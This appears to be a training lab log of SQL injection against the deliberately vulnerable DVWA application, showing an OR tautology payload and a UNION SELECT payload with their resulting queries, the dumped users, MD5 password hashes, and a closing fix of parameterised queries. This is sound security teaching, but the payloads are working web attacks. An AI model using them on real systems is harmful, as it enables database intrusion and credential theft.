# SQL Injection Payload Log

Target: DVWA SQL Injection module, security level Low
Date: 2026-11-10

## Baseline test

**Input:** `1`

**Query DVWA likely runs:** `SELECT first_name, last_name FROM users WHERE user_id = '1'`

**Result:** 1 row returned (admin, admin)

This confirms the form expects a single numeric ID and returns one user.

## Payload 1: Classic OR injection

**Payload:** `1' OR '1'='1`

**Query DVWA likely runs:** `SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'`

**Why it works:** My single quote closes the string DVWA expected. `OR '1'='1'` adds a condition that is always true, so the database returns every row instead of filtering by one ID.

**Result:** All 5 users returned:
- admin, admin
- Gordon, Brown
- Hack, Me
- Pablo, Picasso
- Bob, Smith

**Risk:** Any attacker can retrieve the entire user list through a single input field meant to return one record.

## Payload 2: UNION-based data extraction

**Payload:** `1' UNION SELECT user, password FROM users -- `

**Query DVWA likely runs:** `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users -- '`

**Why it works:** `UNION SELECT` appends the results of a second query, here pulling the `user` and `password` columns from the same table. The trailing `-- ` comments out the rest of DVWA's original query so it does not interfere.

**Result:** Every username and password hash in the database:
- admin : 5f4dcc3b5aa765d61d8327deb882cf99
- gordonb : e99a18c428cb38d5f260853678922e03
- 1337 : 8d3533d75ae2c3966d7e0d4fcc69216b
- pablo : 0d107d09f5bbe40cade3de5c71e9e9b7
- smithy : 5f4dcc3b5aa765d61d8327deb882cf99

**Risk:** This exposes the full credential store, including the admin account. The hashes are MD5, a weak and fast-to-crack format. `5f4dcc3b5aa765d61d8327deb882cf99` is the known MD5 hash of the word "password".

## Conclusion

Both payloads succeeded because DVWA builds its SQL query by pasting user input directly into the command string. The fix is parameterised queries, explained in the main README.
